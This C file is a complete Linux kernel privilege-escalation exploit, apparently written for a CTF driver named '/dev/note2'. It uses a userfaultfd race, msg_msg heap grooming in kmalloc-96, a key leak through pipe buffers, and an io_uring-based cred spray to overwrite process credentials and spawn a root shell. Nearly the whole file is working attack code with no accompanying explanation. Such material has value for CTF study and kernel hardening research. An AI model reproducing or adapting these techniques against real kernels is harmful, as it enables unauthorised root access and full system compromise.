#define _GNU_SOURCE
#include <assert.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdint.h>
#include <liburing.h>
#include <pthread.h>
#include <sys/ioctl.h>
#include <sys/capability.h>
#include <sys/msg.h>
#include <sys/shm.h>
#include <sys/types.h>
#include <sys/xattr.h>
#include <linux/capability.h>
#include <linux/types.h>
#include <liburing.h>
#include "userfault.h"

typedef uint8_t u8;
typedef uint16_t u16;
typedef uint32_t u32;
typedef uint64_t u64;

typedef int8_t i8;
typedef int16_t i16;
typedef int32_t i32;
typedef int64_t i64;

#define DEBUG
#ifdef DEBUG
#define errExit(msg)        \
    do                      \
    {                       \
        perror(msg);        \
        exit(EXIT_FAILURE); \
    } while (0)
#define WAIT()                \
    do                        \
    {                         \
        puts("[WAITING...]"); \
        getchar();            \
    } while (0)

#define logOK(msg, ...) dprintf(2, "[+] " msg "\n", ##__VA_ARGS__);
#define logInfo(msg, ...) dprintf(2, "[*] " msg "\n", ##__VA_ARGS__);
#define logErr(msg, ...) dprintf(2, "[!] " msg "\n", ##__VA_ARGS__);
#else
#define errExit(...) \
    do               \
    {                \
    } while (0)

#define WAIT(...) errExit(...)
#define logOK(...) errExit(...)
#define logInfo(...) errExit(...)
#define logErr(...) errExit(...)
#endif

#define ARR_SIZE(arr) sizeof(arr) / sizeof(arr[0])

u64 user_ip;
u64 user_cs;
u64 user_rflags;
u64 user_sp;
u64 user_ss;
void get_shell()
{
    if (getuid())
    {
        errExit("NO ROOT");
    }
    logOK("Rooted!");
    char *argv[] = {"/bin/sh", NULL};
    char *envp[] = {NULL};
    execve(argv[0], argv, envp);
}
void save_state()
{
    __asm__(
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop qword ptr[rip+user_rflags];");
    user_ip = (u64)get_shell;
    logInfo("Saved user state");
}

static inline int pin_cpu(int cpu)
{
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(cpu, &cpuset);
    return sched_setaffinity(0, sizeof cpuset, &cpuset);
}

/* -------------- Device stuff -------------- */

#define IOC_MAGIC '\xFF'

#define IO_ADD _IOWR(IOC_MAGIC, 0, struct ioctl_arg)
#define IO_EDIT _IOWR(IOC_MAGIC, 1, struct ioctl_arg)
#define IO_SHOW _IOWR(IOC_MAGIC, 2, struct ioctl_arg)
#define IO_DEL _IOWR(IOC_MAGIC, 3, struct ioctl_arg)

struct ioctl_arg
{
    uint64_t idx;
    uint64_t size;
    uint64_t addr;
};

struct node
{
    uint64_t key;
    uint64_t size;
    uint64_t addr;
};

int devFd;
#define DEVFILE "/dev/note2"

void openDev()
{
    devFd = open(DEVFILE, O_RDONLY);
    if (devFd < 0)
    {
        errExit("openDev::open");
    }
}

int io_add(void *addr, uint64_t size)
{
    struct ioctl_arg arg_ =
        {
            .size = size,
            .addr = (u64)addr};

    return ioctl(devFd, IO_ADD, &arg_);
}

int io_edit(uint64_t idx, void *addr)
{
    struct ioctl_arg arg_ = {
        .idx = idx,
        .addr = (u64)addr};

    return ioctl(devFd, IO_EDIT, &arg_);
}

int io_show(uint64_t idx, void *addr)
{
    struct ioctl_arg arg_ = {
        .idx = idx,
        .addr = (u64)addr};

    return ioctl(devFd, IO_SHOW, &arg_);
}

int io_del(uint64_t idx)
{
    struct ioctl_arg arg_ =
        {.idx = idx};

    return ioctl(devFd, IO_DEL, &arg_);
}

/* -------------- End -------------- */

/* ---------- kmalloc-96 stuff --------------*/

/*
/home/note # cat /sys/kernel/slab/kmalloc-96/objs_per_slab
42
/home/note # cat /sys/kernel/slab/kmalloc-96/cpu_partial
30
*/
#define KMALLOC96_objsPerSlab 42
#define KMALLOC96_cpuPartial 30

#define MSGMSG_HEADER_SIZE 0x30UL
#define DATALEN_MSG (PAGE_SIZE - MSGMSG_HEADER_SIZE)
#define TARGET_SIZE 96
struct msgmsg
{
    long mtype;
    char mtext[(MSGMSG_HEADER_SIZE + DATALEN_MSG) + TARGET_SIZE - 8]; //
};

struct msgmsg msg = {.mtype = 1};

/**
 * @brief kmalloc-96 for struct msg-msg
 * @param msg `struct msgmsg`
 * @param num `numbers of msgs`
 *
 * @return int
 */
int allocate_msgmsg(struct msgmsg *msg, int num)
{

    int qid = msgget(IPC_PRIVATE, IPC_CREAT | 0666);
    for (int ix = 0; ix != num; ++ix)
    {
        if (msgsnd(qid, msg, sizeof(msg->mtext) - MSGMSG_HEADER_SIZE, 0) < 0)
            errExit("msgsnd");
    }
    return qid;
}

void free_msgmsg(int qid, struct msgmsg *msg)
{
    msgrcv(qid, msg, sizeof(*msg), msg->mtype, 0);
}

int overflow_objs[KMALLOC96_objsPerSlab * (KMALLOC96_cpuPartial + 1)];
int pre_victim[KMALLOC96_objsPerSlab - 1];
int post_victim[KMALLOC96_objsPerSlab + 1];

/* -------------- End -------------- */

#define CRED_SIZE 192

static int sys_io_uring_setup(size_t entries, struct io_uring_params *p)
{
    return syscall(__NR_io_uring_setup, entries, p);
}

static int uring_create(size_t n_sqe, size_t n_cqe)
{
    struct io_uring_params p = {
        .cq_entries = n_cqe,
        .flags = IORING_SETUP_CQSIZE};

    int res = sys_io_uring_setup(n_sqe, &p);
    if (res < 0)
        errExit("uring_create::io_uring_setup");
    return res;
}

static int alloc_n_creds(int uring_fd, size_t n_creds)
{
    for (size_t i = 0; i < n_creds; i++)
    {
        struct __user_cap_header_struct cap_hdr = {
            .pid = 0,
            .version = _LINUX_CAPABILITY_VERSION_3};

        struct __user_cap_data_struct cap_data[2] = {0};

        /* allocate new cred */
        if (syscall(SYS_capset, &cap_hdr, (void *)cap_data))
            errExit("alloc_n_creds::capset");

        if (syscall(SYS_io_uring_register, uring_fd, IORING_REGISTER_PERSONALITY, 0, 0) < 0)
            errExit("alloc_n_creds::io_uring_register");
    }
}

/* -------------- End -------------- */

#define PAGE_FAULT_ADDR_0 0x1337000ULL
void *page0;
void *page1;
uint64_t uf_page[PAGE_SIZE / 8];

struct pipe_fds
{
    union
    {
        struct
        {
            int read;
            int write;
        };
        int raw[2];
    };
};

uint64_t key;
bool searchKey(const char *buf, size_t size)
{
    uint64_t *cur = (uint64_t *)buf;
    size_t len = size / 8;
    for (uint64_t i = 0; i < len; ++i)
    {
        if (cur[i] != 0 && ((char *)&cur[i] - buf) % CRED_SIZE == 0)
        {
            logOK("Found the key: 0x%lx", cur[i]);
            key = cur[i];
            return true;
        }
    }
    return false;
}

void PageFaultEvent()
{

    struct pipe_fds pipes[16];
    for (size_t i = 0; i < ARR_SIZE(pipes); i++)
        pipe(pipes[i].raw);

    int uring_cred_dumps[2] = {uring_create(0x80, 0x100), uring_create(0x80, 0x100)};

    /*Clean slub*/
    for (uint64_t i = 0; i < ARR_SIZE(pre_victim); ++i)
    {
        free_msgmsg(pre_victim[i], &msg);
    }

    for (uint64_t i = 0; i < ARR_SIZE(post_victim); ++i)
    {
        free_msgmsg(post_victim[i], &msg);
    }

    for (uint64_t i = 0; i < ARR_SIZE(overflow_objs); ++i)
    {
        free_msgmsg(overflow_objs[i], &msg);
    }

    usleep(10000);
    io_del(0);
    io_add("LOL", 2);

    for (size_t i = 0; i < ARR_SIZE(pipes); i++)
    {
        if (write(pipes[i].write, uf_page, PAGE_SIZE) < 0)
            errExit("PageFaultEvent::write(pipe_fds)");
    }

    ufd_unblock_page_copy(page0, uf_page);

    usleep(10000);

    for (uint64_t pipe_idx = 0; pipe_idx < ARR_SIZE(pipes); ++pipe_idx)
    {
        char read_buf[TARGET_SIZE];
        for (uint64_t i = 0; i < PAGE_SIZE / TARGET_SIZE; ++i)
        {
            memset(read_buf, 0, sizeof(read_buf));
            if (read(pipes[pipe_idx].read, read_buf, sizeof(read_buf)) != sizeof(read_buf))
            {
                errExit("PageFaultEvent::read(pipes[pipe_idx])");
            }
            if (searchKey(read_buf, sizeof(read_buf)))
                goto found_key;
        }
    }

    logErr("Can't leak the key, try harder!!!");
    return;

found_key:
    alloc_n_creds(uring_cred_dumps[0], 0x4000);
    for (uint64_t pipe_idx = 0; pipe_idx < ARR_SIZE(pipes); ++pipe_idx)
    {
        close(pipes[pipe_idx].write);
        close(pipes[pipe_idx].read);
    }

    int spray[0x100];

    alloc_n_creds(uring_cred_dumps[1], ARR_SIZE(spray));
    close(uring_cred_dumps[1]);
    usleep(10000);

    struct pipe_fds child_comm;
    pipe(child_comm.raw);

    for (uint i = 0; i < ARR_SIZE(spray); ++i)
    {
        int pid = fork();
        if (pid)
        {
            spray[i] = pid;
            continue;
        }
        else
        {
            sleep(2);
            uid_t uid = getuid();
            printf("uid: %d\n", uid);
            if (!uid)
            {
                write(child_comm.write, "ROOT!", 6);
                system("sh");
            }

            exit(0);
        }
    }

    usleep(10000);

    for (uint64_t i = 0; i < ARR_SIZE(uf_page); i++)
    {
        uf_page[i] ^= key;
    }
    ufd_unblock_page_copy(page1, uf_page);
    struct pollfd poller[] = {{.events = POLLIN, .fd = child_comm.read}};

    if (poll(poller, 1, 3000) != 1)
        errExit("Could not overwrite struct cred. Try again..");
}

void editThread(void *)
{
    pin_cpu(0);
    io_edit(0, page0);
}

int main(int argc, char **argv, char **envp)
{
    pin_cpu(0);
    openDev();

    userfaultfd_init();
    page0 = mmap((void *)PAGE_FAULT_ADDR_0, PAGE_SIZE * 2, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE | MAP_FIXED, -1, 0);
    if (page0 == MAP_FAILED)
    {
        errExit("main::mmmap");
    }
    page1 = page0 + PAGE_SIZE;
    userEventHandler = PageFaultEvent;

    memset(msg.mtext, 'X', sizeof(msg.mtext)); // Easy to debug

    io_del(0);

    for (uint64_t i = 0; i < ARR_SIZE(overflow_objs); ++i)
    {
        if ((overflow_objs[i] = allocate_msgmsg(&msg, 1)) == -1)
            logErr("main::allocate_msgmsg at overflow_objs[%lu]", i);
    }

    for (uint64_t i = 0; i < ARR_SIZE(pre_victim); ++i)
    {
        if ((pre_victim[i] = allocate_msgmsg(&msg, 1)) == -1)
            logErr("main::allocate_msgmsg at pre_victim[%lu]", i);
    }

    io_add(calloc(1, TARGET_SIZE), TARGET_SIZE);

    for (uint64_t i = 0; i < ARR_SIZE(post_victim); ++i)
    {
        if ((post_victim[i] = allocate_msgmsg(&msg, 1)) == -1)
            logErr("main::allocate_msgmsg at post_victim[%lu]", i);
    }

    userfaultfd_register(page0, PAGE_SIZE);
    userfaultfd_register(page1, PAGE_SIZE);
    startRace = 1;

    pthread_t thread_edit;
    pthread_create(&thread_edit, NULL, editThread, NULL);

    usleep(10000);

    io_edit(0, page1);

    logOK("Done!");
    sleep(1000000);
}
